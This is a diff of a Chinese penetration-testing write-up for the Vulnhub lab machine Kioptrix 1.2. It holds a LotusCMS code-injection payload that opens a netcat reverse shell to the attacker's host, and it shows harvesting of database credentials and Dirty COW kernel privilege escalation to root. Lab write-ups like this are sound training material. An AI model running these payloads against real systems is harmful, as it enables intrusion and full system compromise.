@@ -1,7 +1,7 @@
 ---
-title: Vulnhub - Kioptrix1.2
+title: Vulnhub - Kioptrix 1.2
 published: 2026-05-05
-description: 通过LotusCMS漏洞获取WebShell，利用Dirty COW内核漏洞提权至root的靶机渗透记录
+description: 利用 LotusCMS 漏洞获取 Web Shell，通过数据库凭据复用进行横向移动，最终使用 Dirty COW 内核漏洞和 sudo 配置漏洞完成提权
 image: './img/header/Kioptrix1.2.png'
 tags: ["Vulnhub", "Security","靶机", "writeup"]
 category: 'Security'
@@ -11,33 +11,24 @@ lang: ''
 
 # 前言
 
-### 靶场介绍
-
-password123 (root)
-
-
 ### 靶场信息
 
-**靶机IP**： 
+**靶机IP**： 192.168.200.156
 
-**靶机介绍：**
+**靶机介绍：** https://www.vulnhub.com/entry/kioptrix-level-12-3,24/
 
-**下载（镜像）：**
+**下载（镜像）：**[https://download.vulnhub.com/kioptrix/KVM3.rar](https://download.vulnhub.com/kioptrix/KVM3.rar)
 
-
-### 涉及工具
-
+>注意：**这项挑战的关键**在于：找到 IP 地址（DHCP 客户端）后，编辑 hosts 文件并将其指向**kioptrix3.com。**
 
 ### 思维导图
 
+![](./img/Kioptrix1.2/Kioptrix1.2-攻击链思维导图.png)
 
-# 1.信息收集
+---
+# 1. 信息收集
 
-![](./img/Kioptrix1.2/image-20260430135620954.png)
-
-## 1.1.Nmap信息扫描
-![](./img/Kioptrix1.2/image-20260430140136917.png)
-
+## 1.1 Nmap 信息扫描
 ### 端口扫描
 
 ```bash
@@ -64,10 +55,9 @@ PORT   STATE SERVICE VERSION
 MAC Address: 00:0C:29:EC:A5:EE (VMware)
 ```
 
-
 ### 漏洞扫描
 
-扫描花了很长时间，但是回看扫描结果，这里的扫描结果显示存在sql注入
+漏洞扫描花了很长时间，但是回看扫描结果，这里提示了网站存在的 SQL 注入我没有测试出来。
 
 ```bash
 PORT   STATE SERVICE
@@ -145,45 +135,58 @@ PORT   STATE SERVICE
 MAC Address: 00:0C:29:EC:A5:EE (VMware)
 ```
 
+---
+## 1.2 Web信息收集
 
-## 1.2 Web渗透
+Web 渗透方面，我先去探测一下目录扫描，在等待结果的同时，去对主页的一些结构和源码进行简单的测试分析。
 
-![](./img/Kioptrix1.2/image-20260430140145291.png)
+### 页面探测
 
-外部渗透方面，我先去探测一下目录扫描，然后再对主页的一些结构和源码进行简单的测试分析，
+#### 主页
 
-### 默认页面探测
+访问网站主目录，像是一个 Blog 的界面，告诉我们他们开发了一个 CMS，然后这个页面是他们用来公布内容的 Blog 上
 
-访问网站主目录，像是一个blog的界面，页面上写的内容
+**页面关键信息摘录：**
 
-![](./img/Kioptrix1.2/image-20260430111116958.png)
+- URL：`http://192.168.200.156/index.php?page=index`
 
-从nmap报告中可以看出是存在sql注入的，但是我刚开始做的时候没有尝试成功
+- 站点名称：Ligoat Security
 
-![](./img/Kioptrix1.2/image-20260430111303312.png)
+- 可见功能入口：首页 / 博客 / 后台登录
 
-![](./img/Kioptrix1.2/image-20260430111329327.png)
+- LFI测试无效
 
-https://www.php.net/manual/zh/function.eval.php
+![](./img/Kioptrix1.2/image-20260502123215556.png)
 
-![](./img/Kioptrix1.2/image-20260430111417751.png)
+> 实际这里存在一个 SQL 注入，可使用 `' or 1=2 -- - ` 让页面报错。（当时没测出来，看了 Nmap 才知道）
+> ![](./img/Kioptrix1.2/image-20260430111329327.png)
 
+---
+#### 后台登录页
 
- 后台界面,万能密钥简单测试不行。比较重要的一个信息，地下写了“Proudly Powered by: [LotusCMS](http://www.lotuscms.org)”，权限立足阶段可以查询有没有相关cms的exp
+- **URL**：`http://192.168.200.156/index.php?system=Admin`
 
-http://192.168.200.156/index.php?system=Admin
+- 万能密码简单测试无效
 
-![](./img/Kioptrix1.2/image-20260430111545116.png)
+- **关键发现**：页面底部版权信息显示 `Proudly Powered by: LotusCMS`
 
+![](./img/Kioptrix1.2/image-20260502123016028.png)
 
-随便点到一个留言板，可能存在update注入目前不太清楚，然后有时候不能上传传入文件
+> **待跟进（权限立足阶段）**：查询 LotusCMS 已知 CVE / 公开 EXP
 
-http://192.168.200.156/index.php?system=Blog&post=1281005380
+---
+#### 留言板
+
+页面存在文本输入框，疑似可注入点（update 注入待验证），目前优先级没前几个页面高，没有测试，可以留做备用突破点
+
+**URL:** `http://192.168.200.156/index.php?system=Blog&post=1281005380`
 
 ![](./img/Kioptrix1.2/image-20260428211005131.png)
 
 
 ### 目录扫描
+
+工具：Dirsearch
 
 ```bash
 [08:48:19] 403 -  333B  - /.httr-oauth
@@ -217,58 +220,72 @@ http://192.168.200.156/index.php?system=Blog&post=1281005380
 [08:48:45] 200 -   18B  - /update.php
 ```
 
-可以看到整个目录结构，但是具体内容无法读取
+**人工筛选** 
 
-```text
-http://192.168.200.156/modules/
+```bash
+=== 状态码 200（高利用价值）
+http://192.168.200.156/update.php		# 升级脚本
+http://192.168.200.156/phpmyadmin/		# phpMyAdmin 登入界面
+http://192.168.200.156/favicon.ico		# 网站图标，可通过计算 Hash 值（如 mmh3）来识别 CMS 或 Web 框架类型
+
+=== 状态码 301/302（重定向）
+http://192.168.200.156/phpmyadmin -> http://192.168.200.156/phpmyadmin/
+http://192.168.200.156/core -> http://192.168.200.156/core/
+http://192.168.200.156/gallery -> http://192.168.200.156/gallery/
+http://192.168.200.156/style -> http://192.168.200.156/style/
+http://192.168.200.156/cache -> http://192.168.200.156/cache/
 ```
-![](./img/Kioptrix1.2/image-20260428211641842.png)
 
-重点，我想去关注一下dashboard里面的内容，看看有没有会存放一些关于控制后台的密码泄露之类的东西
+---
+# 2. 权限立足
 
+在登入界面看到提示  （Proudly Powered by: [LotusCMS](http://www.lotuscms.org)）, 结合网站主页底部 @2011 缩小范围，上网搜寻 EXP 和 POC。
 
-
-
-
-
-# 2.权限立足
+---
+## 2.1 操作过程思维导图
 
 ![](./img/Kioptrix1.2/image-20260430135903317.png)
 
-在登入界面看到提示  （Proudly Powered by: [LotusCMS](http://www.lotuscms.org)）, 结合网站主页底部 @2011 缩小范围，上网搜寻exp 和 poc。
+---
+## 2.2 漏洞情报收集
 
-https://nvd.nist.gov/vuln/detail/CVE-2011-0518
+**相关文章链接：**
 
-https://www.exploit-db.com/exploits/16982
+- https://nvd.nist.gov/vuln/detail/CVE-2011-0518
 
-https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/http/lcms_php_exec
+- https://www.exploit-db.com/exploits/18565
 
-执行payload
+- https://www.exploit-db.com/exploits/16982
+
+- https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/http/lcms_php_exec
+
+**EXP:**
+
+- https://github.com/murhussain/Mur-Kioptrix-LotusCMS-Exploit
+
+- https://github.com/nguyen-ngo/LotusCMS-3.0-RCE-exploit
+
+- https://www.exploit-db.com/exploits/15964
+---
+## 2.3 漏洞利用
+
+### 执行 payload
 
 ```bash
 curl -X POST "http://192.168.200.156/index.php" \
 -d "page=index');\${passthru('nc -e /bin/bash 192.168.200.142 4444')};//"
 ```
 
-连接反弹shell 
+### 连接反弹 shell 
 
 ![](./img/Kioptrix1.2/image-20260429193827156.png)
 
+---
+# 3.提权
 
-### 过程AI总结
+## 3.1 信息收集
 
-[0x002-Kioptrix1.2拿下webshell过程](0x002-Kioptrix1.2拿下webshell过程.md)
-
-
-### 1.3 红笔追加操作
-
-
-# 3.权限提升
-
-
-操作步骤
-
-检查当前用户，升级交互模式
+### 获得 www-data 的反弹 shell 后，提升交互方式：
 
 ```bash
 ┌──(kali㉿kali)-[~]
@@ -276,224 +293,88 @@ curl -X POST "http://192.168.200.156/index.php" \
 listening on [any] 4444 ...
 connect to [192.168.200.142] from (UNKNOWN) [192.168.200.156] 47095
 
-whoami
-www-data
-whereis python
-python: /usr/bin/python2.5 /usr/bin/python /etc/python2.5 /etc/python /usr/lib/python2.4 /usr/lib/python2.3 /usr/lib/python2.5 /usr/local/lib/python2.5 /usr/include/python2.5 /usr/share/python /usr/share/man/man1/python.1.gz
-
+# 提升交互式 Shell
 python -c 'import pty;pty.spawn("/bin/bash")'
 www-data@Kioptrix3:/home/www/kioptrix3.com$ 
 ```
 
-Web目录源码分析收集有效信息
+### 系统层信息枚举：
+
+```bash
+www-data@Kioptrix3:/home/www/kioptrix3.com$ whoami
+www-data
+
+www-data@Kioptrix3:/home/www/kioptrix3.com$ uname -a
+Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux
+```
+
+### 有效提权信息列举：
+
+```bash
+# 列出具有suid权限的用户
+www-data@Kioptrix3:/home/www/kioptrix3.com$ find / -perm -u=s -type f 2>/dev/null
+<w/kioptrix3.com$ find / -perm -u=s -type f 2>/dev/null                      
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+# ... 省略一些内容，无有效利用信息
+/bin/umount
+/bin/ping6
+/bin/su
+
+# 查看计划任务
+www-data@Kioptrix3:/home/www/kioptrix3.com$ cat /etc/crontab
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+```
+
+---
+## 3.2 敏感信息泄露（补充枚举）
+
+在着手内核提权前，对 Web 目录的配置文件进行了排查，成功收集到了数据库的高权限凭据：
 
 ```bash
 www-data@Kioptrix3:/home/www/kioptrix3.com$ find . -name "*conf*"
-find . -name "*conf*"
-./modules/TinyMCE/tiny_mce/plugins/inlinepopups/skins/clearlooks2/img/confirm.gif
 ./gallery/gconfig.php
-./data/config
-./data/modules/Blog/data/config.txt
-www-data@Kioptrix3:/home/www/kioptrix3.com$ 
+# ...省略部分输出...
+
+www-data@Kioptrix3:/home/www/kioptrix3.com$ cat ./gallery/gconfig.php
+# 提取出数据库连接凭据
+$GLOBALS["gallarific_mysql_server"] = "localhost";
+$GLOBALS["gallarific_mysql_database"] = "gallery";
+$GLOBALS["gallarific_mysql_username"] = "root";
+$GLOBALS["gallarific_mysql_password"] = "fuckeyou";
 ```
 
-```php
-cat gconfig.php
-<?php
-        error_reporting(0);
-        /*
-                A sample Gallarific configuration file. You should edit
-                the installer details below and save this file as gconfig.php
-                Do not modify anything else if you don't know what it is.
-        */
-
-        // Installer Details -----------------------------------------------
-
-        // Enter the full HTTP path to your Gallarific folder below,
-        // such as http://www.yoursite.com/gallery
-        // Do NOT include a trailing forward slash
-
-        $GLOBALS["gallarific_path"] = "http://kioptrix3.com/gallery";
-
-        $GLOBALS["gallarific_mysql_server"] = "localhost";
-        $GLOBALS["gallarific_mysql_database"] = "gallery";
-        $GLOBALS["gallarific_mysql_username"] = "root";
-        $GLOBALS["gallarific_mysql_password"] = "fuckeyou";
-
-        // Setting Details -------------------------------------------------
-
-if(!$g_mysql_c = @mysql_connect($GLOBALS["gallarific_mysql_server"], $GLOBALS["gallarific_mysql_username"], $GLOBALS["gallarific_mysql_password"])) {
-                echo("A connection to the database couldn't be established: " . mysql_error());
-                die();
-}else {
-        if(!$g_mysql_d = @mysql_select_db($GLOBALS["gallarific_mysql_database"], $g_mysql_c)) {
-                echo("The Gallarific database couldn't be opened: " . mysql_error());
-                die();
-        }else {
-                $settings=mysql_query("select * from gallarific_settings");
-                if(mysql_num_rows($settings)!=0){
-                        while($data=mysql_fetch_array($settings)){
-                                $GLOBALS["{$data['settings_name']}"]=$data['settings_value'];
-                        }
-                }
-
-        }
-}
-
-?>
-```
-
-```php
-        $GLOBALS["gallarific_mysql_server"] = "localhost";
-
-        $GLOBALS["gallarific_mysql_database"] = "gallery";
-
-        $GLOBALS["gallarific_mysql_username"] = "root";
-
-        $GLOBALS["gallarific_mysql_password"] = "fuckeyou";
-```
-
+>同时记录到可能的管理员凭据组合：`admin | n0t7t1k4`。这些凭据可作为提权失败时的备用横向/纵向移动手段。
 
 ![博客后台密码](./img/Kioptrix1.2/image-20260429195404838.png)
 
-| admin | n0t7t1k4 |
+---
+## 3.3 内核漏洞提权
 
-
-利用Dirty COW提权
-
-kali
+由于在 SUID 权限和计划任务的信息收集上没有找到有效信息，我决定使用内核提权来获得 root shell。针对内核 `2.6.24`，在攻击机搜索可用的漏洞利用代码，锁定目标为 Dirty COW 提权系列。
 
 ```bash
 ┌──(kali㉿kali)-[~/vulnhub/Kioptrix1.2]
-└─$ searchsploit linux kernel 2.6.24
------------------------------------------------------------------------------------------------ --------------------------------- Exploit Title                                                                                 |  Path
------------------------------------------------------------------------------------------------ ---------------------------------
-Linux Kernel (Solaris 10 / < 5.10 138888-01) - Local Privilege Escalation                      | solaris/local/15962.c
-Linux Kernel 2.4.1 < 2.4.37 / 2.6.1 < 2.6.32-rc5 - 'pipe.c' Local Privilege Escalation (3)     | linux/local/9844.py
-Linux Kernel 2.4.4 < 2.4.37.4 / 2.6.0 < 2.6.30.4 - 'Sendpage' Local Privilege Escalation (Meta | linux/local/19933.rb
-Linux Kernel 2.6.0 < 2.6.31 - 'pipe.c' Local Privilege Escalation (1)                          | linux/local/33321.c
-Linux Kernel 2.6.10 < 2.6.31.5 - 'pipe.c' Local Privilege Escalation                           | linux/local/40812.c
-Linux Kernel 2.6.17 < 2.6.24.1 - 'vmsplice' Local Privilege Escalation (2)                     | linux/local/5092.c
-Linux Kernel 2.6.19 < 5.9 - 'Netfilter Local Privilege Escalation                              | linux/local/50135.c
-Linux Kernel 2.6.20/2.6.24/2.6.27_7-10 (Ubuntu 7.04/8.04/8.10 / Fedora Core 10 / OpenSuse 11.1 | linux/remote/8556.c
-Linux Kernel 2.6.22 < 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' Race Condition Privilege Esca | linux/local/40616.c
-Linux Kernel 2.6.22 < 3.9 - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (/e | linux/local/40847.cpp
-Linux Kernel 2.6.22 < 3.9 - 'Dirty COW PTRACE_POKEDATA' Race Condition (Write Access Method)   | linux/local/40838.c
+└─$ searchsploit linux kernel 2.6.24 | grep "Dirty COW"
+Linux Kernel 2.6.22 < 3.9 - 'Dirty COW /proc/self/mem' Race Condition Privilege Esca | linux/local/40616.c
 Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation  | linux/local/40839.c
-Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' /proc/self/mem Race Condition (Write Access Method)    | linux/local/40611.c
-Linux Kernel 2.6.23 < 2.6.24 - 'vmsplice' Local Privilege Escalation (1)                       | linux/local/5093.c
-Linux Kernel 2.6.24_16-23/2.6.27_7-10/2.6.28.3 (Ubuntu 8.04/8.10 / Fedora Core 10 x86-64) - 's | linux_x86-64/local/9083.c
-Linux Kernel 2.6.27.7-generic/2.6.18/2.6.24-1 - Local Denial of Service                        | linux/dos/7454.c
-Linux Kernel 2.6.9 < 2.6.25 (RHEL 4) - utrace and ptrace Local Denial of Service (1)           | linux/dos/31965.c
-Linux Kernel 2.6.9 < 2.6.25 (RHEL 4) - utrace and ptrace Local Denial of Service (2)           | linux/dos/31966.c
-Linux Kernel 3.14-rc1 < 3.15-rc4 (x64) - Raw Mode PTY Echo Race Condition Privilege Escalation | linux_x86-64/local/33516.c
-Linux Kernel 4.10.5 / < 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free                           | linux/dos/43234.c
-Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation                                     | linux/local/41886.c
-Linux Kernel < 2.6.26.4 - SCTP Kernel Memory Disclosure                                        | linux/local/7618.c
-Linux Kernel < 2.6.28 - 'fasync_helper()' Local Privilege Escalation                           | linux/local/33523.c
-Linux Kernel < 2.6.29 - 'exit_notify()' Local Privilege Escalation                             | linux/local/8369.sh
-Linux Kernel < 2.6.30.5 - 'cfg80211' Remote Denial of Service                                  | linux/dos/9442.c
-Linux Kernel < 2.6.31-rc4 - 'nfs4_proc_lock()' Denial of Service                               | linux/dos/10202.c
-Linux Kernel < 2.6.31-rc7 - 'AF_IRDA' 29-Byte Stack Disclosure (2)                             | linux/local/9543.c
-Linux Kernel < 2.6.34 (Ubuntu 10.10 x86) - 'CAP_SYS_ADMIN' Local Privilege Escalation (1)      | linux_x86/local/15916.c
-Linux Kernel < 2.6.34 (Ubuntu 10.10 x86/x64) - 'CAP_SYS_ADMIN' Local Privilege Escalation (2)  | linux/local/15944.c
-Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) - 'CAN BCM' Local Privilege Escalation       | linux/local/14814.c
-Linux Kernel < 2.6.36-rc4-git2 (x86-64) - 'ia32syscall' Emulation Privilege Escalation         | linux_x86-64/local/15023.c
-Linux Kernel < 2.6.36-rc6 (RedHat / Ubuntu 10.04) - 'pktcdvd' Kernel Memory Disclosure         | linux/local/15150.c
-Linux Kernel < 2.6.36.2 (Ubuntu 10.04) - 'Half-Nelson.c' Econet Privilege Escalation           | linux/local/17787.c
-Linux Kernel < 2.6.37-rc2 - 'ACPI custom_method' Local Privilege Escalation                    | linux/local/15774.c
-Linux Kernel < 2.6.37-rc2 - 'TCP_MAXSEG' Kernel Panic (Denial of Service) (2)                  | linux/dos/16952.c
-Linux Kernel < 3.16.1 - 'Remount FUSE' Local Privilege Escalation                              | linux/local/34923.c
-Linux Kernel < 3.16.39 (Debian 8 x64) - 'inotfiy' Local Privilege Escalation                   | linux_x86-64/local/44302.c
-Linux Kernel < 3.2.0-23 (Ubuntu 12.04 x64) - 'ptrace/sysret' Local Privilege Escalation        | linux_x86-64/local/34134.c
-Linux Kernel < 3.4.5 (Android 4.2.2/4.4 ARM) - Local Privilege Escalation                      | arm/local/31574.c
-Linux Kernel < 3.5.0-23 (Ubuntu 12.04.2 x64) - 'SOCK_DIAG' SMEP Bypass Local Privilege Escalat | linux_x86-64/local/44299.c
-Linux Kernel < 3.8.9 (x86-64) - 'perf_swevent_init' Local Privilege Escalation (2)             | linux_x86-64/local/26131.c
-Linux Kernel < 3.8.x - open-time Capability 'file_ns_capable()' Local Privilege Escalation     | linux/local/25450.c
-Linux Kernel < 4.10.13 - 'keyctl_set_reqkey_keyring' Local Denial of Service                   | linux/dos/42136.c
-Linux kernel < 4.10.15 - Race Condition Privilege Escalation                                   | linux/local/43345.c
-Linux Kernel < 4.11.8 - 'mq_notify: double sock_put()' Local Privilege Escalation              | linux/local/45553.c
-Linux Kernel < 4.13.1 - BlueTooth Buffer Overflow (PoC)                                        | linux/dos/42762.txt
-Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                  | linux/local/45010.c
-Linux Kernel < 4.14.rc3 - Local Denial of Service                                              | linux/dos/42932.c
-Linux Kernel < 4.15.4 - 'show_floppy' KASLR Address Leak                                       | linux/local/44325.c
-Linux Kernel < 4.16.11 - 'ext4_read_inline_data()' Memory Corruption                           | linux/dos/44832.txt
-Linux Kernel < 4.17-rc1 - 'AF_LLC' Double Free                                                 | linux/dos/44579.c
-Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                         | linux/local/44298.c
-Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalat | linux_x86-64/local/44300.c
-Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR  | linux/local/43418.c
-Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privileg | linux/local/47169.c
-Linux Kernel < 4.5.1 - Off-By-One (PoC)                                                        | linux/dos/44301.c
------------------------------------------------------------------------------------------------ ---------------------------------Shellcodes: No Results
-                                                                                                                              
-┌──(kali㉿kali)-[~/vulnhub/Kioptrix1.2]
-└─$ searchsploit linux kernel 2.6.24|grep 40839
-Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation  | linux/local/40839.c
-                                                                                                                              
-┌──(kali㉿kali)-[~/vulnhub/Kioptrix1.2]
-└─$ searchsploit linux/local/40839.c -m        
-  Exploit: Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)
-      URL: https://www.exploit-db.com/exploits/40839
-     Path: /usr/share/exploitdb/exploits/linux/local/40839.c
-    Codes: CVE-2016-5195
- Verified: True
-File Type: C source, ASCII text
-Copied to: /home/kali/vulnhub/Kioptrix1.2/40839.c
-
-
-                                                                                                                              
-┌──(kali㉿kali)-[~/vulnhub/Kioptrix1.2]
-└─$ ls                      
-40616.c  40839.c  nmap  web
-                                                                                                                              
-┌──(kali㉿kali)-[~/vulnhub/Kioptrix1.2]
-└─$ 
-                                                                                                                              
-┌──(kali㉿kali)-[~/vulnhub/Kioptrix1.2]
-└─$ python3 -m http.server 8081
-Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
-192.168.200.156 - - [29/Apr/2026 08:15:24] "GET /40839.c HTTP/1.0" 200 -
-Linux kali 6.12.38+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.38-1kali1 (2025-08-12) x86_64
-
-The programs included with the Kali GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Wed Apr 29 08:00:40 2026 from 192.168.200.1
-zsh: corrupt history file /home/kali/.zsh_history
 ```
 
-server
+---
+### **踩坑记录：40616.c 编译失败** 
+
+首先尝试了 `40616.c`，但在靶机上编译时触发了大量结构体未定义的报错（`invalid use of undefined type 'struct stat'`）。由于靶机环境过于老旧，缺失必要的头文件依赖，果断放弃该 EXP，换用兼容性更好的 **40839.c**。
 
 ```bash
-www-data@Kioptrix3:/tmp$ wget 'http://192.168.200.142:8081/40839.c'
-wget 'http://192.168.200.142:8081/40839.c'
---18:17:55--  http://192.168.200.142:8081/40839.c
-           => `40839.c'
-Connecting to 192.168.200.142:8081... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 4,814 (4.7K) [text/x-csrc]
-
-100%[====================================>] 4,814         --.--K/s             
-
-18:17:55 (1.01 GB/s) - `40839.c' saved [4814/4814]
-www-data@Kioptrix3:/tmp$ wget 'http://192.168.200.142:8081/40839.c'
-wget 'http://192.168.200.142:8081/40839.c'
---18:17:55--  http://192.168.200.142:8081/40839.c
-           => `40839.c'
-Connecting to 192.168.200.142:8081... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 4,814 (4.7K) [text/x-csrc]
-
-100%[====================================>] 4,814         --.--K/s             
-
-18:17:55 (1.01 GB/s) - `40839.c' saved [4814/4814]
-www-data@Kioptrix3:/tmp$ ls
-ls
-40616.c  40839.c
-www-data@Kioptrix3:/tmp$ 
+# 无法编译
 
 www-data@Kioptrix3:/tmp$ gcc 40839.c -o exp
 gcc 40839.c -o exp
@@ -504,106 +385,97 @@ gcc 40839.c -o exp
 40839.c:(.text+0x4be): undefined reference to `pthread_create'
 40839.c:(.text+0x4f4): undefined reference to `pthread_join'
 collect2: ld returned 1 exit status
-www-data@Kioptrix3:/tmp$ ls
-ls
-40616.c  40839.c
+```
+
+---
+### 实际操作步骤
+
+#### 1. 攻击机准备与分发
+
+```bash
+searchsploit -m linux/local/40839.c
+
+python3 -m http.server 8081
+```
+
+#### 2.靶机下载与编译修复
+
+在靶机 `/tmp` 目录下载 EXP 并进行编译。**注意**：直接使用 `gcc` 会因为缺少线程库和加密库导致链接失败。
+
+```bash
+www-data@Kioptrix3:/tmp$ wget http://192.168.200.142:8081/40839.c
+
+# 第一次常规编译尝试（失败）
+www-data@Kioptrix3:/tmp$ gcc 40839.c -o exp
+/tmp/ccgHdB72.o: In function `generate_password_hash': undefined reference to `crypt'
+/tmp/ccgHdB72.o: In function `main': undefined reference to `pthread_create'
+
+# 添加必要的库参数进行编译（成功）
 www-data@Kioptrix3:/tmp$ gcc -pthread 40839.c -o exp -lcrypt
-gcc -pthread 40839.c -o exp -lcrypt
-40839.c:193:2: warning: no newline at end of file
-www-data@Kioptrix3:/tmp$ ls
-ls
-40616.c  40839.c  exp
-www-data@Kioptrix3:/tmp$ ./exp 
-./exp
+```
+
+>_注：`-pthread` 用于链接多线程库以触发竞争条件，`-lcrypt` 用于链接加密库以生成 `/etc/passwd` 中的密码哈希。_
+
+#### 3. 执行利用与权限验证
+
+```bash
+www-data@Kioptrix3:/tmp$ ./exp
 /etc/passwd successfully backed up to /tmp/passwd.bak
-Please enter the new password: 
+Please enter the new password: [输入自定密码]
 
 Complete line:
 firefart:figsoZwws4Zu6:0:0:pwned:/root:/bin/bash
 
-su firefart
-Password: 
+# 切换至覆写产生的特权账户
+www-data@Kioptrix3:/tmp$ su firefart
+Password: [输入自定密码]
 
 firefart@Kioptrix3:/tmp# id
-id
 uid=0(firefart) gid=0(root) groups=0(root)
 firefart@Kioptrix3:/tmp# whoami
-whoami
 firefart
-firefart@Kioptrix3:/tmp# sudo -l
-sudo -l
-sudo: no passwd entry for root!
-firefart@Kioptrix3:/tmp# 
-
-firefart@Kioptrix3:/tmp# cat /etc/shadow
-cat /etc/shadow
-root:$1$QAKvVJey$6rRkAMGKq1u62yfDaenUr1:15082:0:99999:7:::
-daemon:*:15075:0:99999:7:::
 ```
 
-> 原本用40616，出了点问题
+至此，Dirty COW 利用成功，成功获取最高系统权限。检查 `/etc/shadow` 确认系统已被完全接管。
 
-```bash
-40616.c: In function 'procselfmemThread':
-40616.c:99: warning: passing argument 2 of 'lseek' makes integer from pointer without a cast
-40616.c: In function 'main':
-40616.c:142: error: invalid use of undefined type 'struct stat'
-40616.c:144: error: invalid use of undefined type 'struct stat'
-40616.c:145: error: invalid use of undefined type 'struct stat'
-40616.c:148: error: invalid use of undefined type 'struct stat'
-40616.c:159:2: warning: no newline at end of file
-www-data@Kioptrix3:/tmp$ ls
-ls
-40616.c
-www-data@Kioptrix3:/tmp$ gcc 40616.c -o exploit
-gcc 40616.c -o exploit
-40616.c: In function 'procselfmemThread':
-40616.c:99: warning: passing argument 2 of 'lseek' makes integer from pointer without a cast
-40616.c: In function 'main':
-40616.c:142: error: invalid use of undefined type 'struct stat'
-40616.c:144: error: invalid use of undefined type 'struct stat'
-40616.c:145: error: invalid use of undefined type 'struct stat'
-40616.c:148: error: invalid use of undefined type 'struct stat'
-40616.c:159:2: warning: no newline at end of file
-```
-
-## 攻击思维导图
-
-![](./img/Kioptrix1.2/image-20260430112304804.png)
-整体流程如图所示，核心有三条线：
-
-**左分支（主要试错路线）** 两次编译失败 → 第一次版本不兼容，第二次缺少编译参数，最终加上 `-pthread -lcrypt` 才成功
-
-**右分支（并行快速验证）** `sudo -l` 是每次提权必查的第一步，本台靶机没有给 sudo 后门所以走了内核漏洞路线
-
-**汇合点** 两条路最终都指向执行 Dirty COW → `su firefart` → root
+![](./img/Kioptrix1.2/Snipaste_2026-04-29_20-18-49.png)
 
 ---
+## 提权路线思维导图
 
-**这次试错过程给你的 OSCP 方法论总结：**
-
-1. `sudo -l` 永远是提权第一步，30秒排除最简单的情况
-2. searchsploit 搜索时要匹配内核版本范围，不是精确匹配
-3. 编译报错不代表 exploit 无效，先看错误类型再换参数或换版本
-4. `undefined type` 错误 → 换版本；`undefined reference` 错误 → 加链接参数
-
-
-
-
-
-### 1.3 红笔追加操作
-
-
-
+![](./img/Kioptrix1.2/image-20260430112304804.png)
 
 
 # 4.总结
 
+这台靶机整体上我认为是偏简单的，我通过两个 exp 直接拿下。不过对于整个打靶思维来说，我的判断不够明确——我是在看到红笔视频标题里 CMS 那个关键词的一刻，才觉得去利用 exp 获得 web shell。在此之前，我一直想通过网站本身的探测去拿下 web shell，感觉这方面的思路不太行。
+
+**回顾整个打靶过程：**
+
+**1. 信息收集阶段**
+
+首先进行了常规端口扫描、详细信息扫描和漏洞扫描，但漏洞扫描比较慢。同时也对网页主目录进行了探测，发现它可能是一个类似于博客的网站。
+
+**2. 漏洞探测阶段**
+
+主页看上去存在文件包含或 SQL 注入的可能。这里有一个我没探测出来的点——网站其实是存在 SQL 注入的，但我测试的时候没整出报错。这是我要注意的一个点：`' or 1=2` 之类的报错方式是我当时没想到的。
+
+同时也进行了目录扫描，扫描到了 phpMyAdmin 的入口。
+
+**3. 获取 Web Shell 阶段**
+
+通过 exp 拿到了 web shell，并通过 web shell 登录了 MySQL 数据库（也可以通过扫描到的 phpMyAdmin 登录 MySQL 数据库）。
+
+**4. 提权阶段（我的做法 vs 靶场预期做法）**
+
+- **我的做法**：直接用脏牛内核漏洞对 Linux 主机进行提权。
+- **靶场作者预期的做法**：拿到 web shell 后，对整个配置文件进行查询，最终找到 MySQL 的配置文件。登录数据库后，能发现 3 对密码，然后对这些密码进行破解，尝试是否可以作为 SSH 密码——最终得到一个权限比 www-data 更高的用户，再通过这个用户去进行后续的提权操作。
 
 
 
 
-# 5.其他
+
+# 5.补充
 
 ### 为什么 gallery 目录有价值
 
@@ -611,7 +483,7 @@ gcc 40616.c -o exploit
 
 从首页源码里可以看到：
 
-```text
+```
 "We've revamped our website for the new release of the new gallery CMS we made"
 ```
 
@@ -621,7 +493,7 @@ gcc 40616.c -o exploit
 
 Gallery 要存图片信息、用户账号，就必须有一个配置文件告诉它：
 
-```text
+```
 数据库在哪 / 用户名是什么 / 密码是什么
 ```
 
@@ -631,7 +503,7 @@ Gallery 要存图片信息、用户账号，就必须有一个配置文件告诉
